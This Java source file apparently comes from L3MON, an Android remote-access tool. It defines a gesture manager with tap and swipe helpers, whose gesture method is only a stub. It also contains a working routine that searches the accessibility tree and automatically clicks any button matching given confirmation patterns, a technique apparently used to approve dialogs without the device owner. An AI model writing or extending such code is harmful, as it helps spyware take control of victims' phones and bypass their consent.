package com.etechd.l3mon.managers;

import android.graphics.Path;
import android.os.Build;
import android.view.accessibility.AccessibilityNodeInfo;
import android.support.annotation.RequiresApi;

public class GestureManager {

    @RequiresApi(api = Build.VERSION_CODES.N)
    public boolean performTap(int x, int y) {
        Path path = new Path();
        path.moveTo(x, y);
        return performGesture(path, 100);
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    public boolean performLongTap(int x, int y, int duration) {
        Path path = new Path();
        path.moveTo(x, y);
        return performGesture(path, duration);
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    public boolean performSwipe(int startX, int startY, int endX, int endY, int duration) {
        Path path = new Path();
        path.moveTo(startX, startY);
        path.lineTo(endX, endY);
        return performGesture(path, duration);
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    private boolean performGesture(Path path, int duration) {
        // Este método deve ser chamado a partir do AccessibilityCaptureService
        // usando dispatchGesture()
        return false; // Implementação real fica no serviço
    }

    public boolean findAndClickConfirmationButton(AccessibilityNodeInfo root, String[] patterns) {
        if (root == null)
            return false;
        return findAndClickButtonRecursive(root, patterns);
    }

    private boolean findAndClickButtonRecursive(AccessibilityNodeInfo node, String[] patterns) {
        if (node == null)
            return false;

        if (node.isClickable() && matchesPattern(node, patterns)) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            return true;
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (findAndClickButtonRecursive(child, patterns)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }
        return false;
    }

    private boolean matchesPattern(AccessibilityNodeInfo node, String[] patterns) {
        String text = node.getText() != null ? node.getText().toString().toLowerCase() : "";
        String desc = node.getContentDescription() != null ? node.getContentDescription().toString().toLowerCase() : "";
        String combined = text + " " + desc;

        for (String pattern : patterns) {
            if (combined.contains(pattern.toLowerCase()))
                return true;
        }
        return false;
    }
}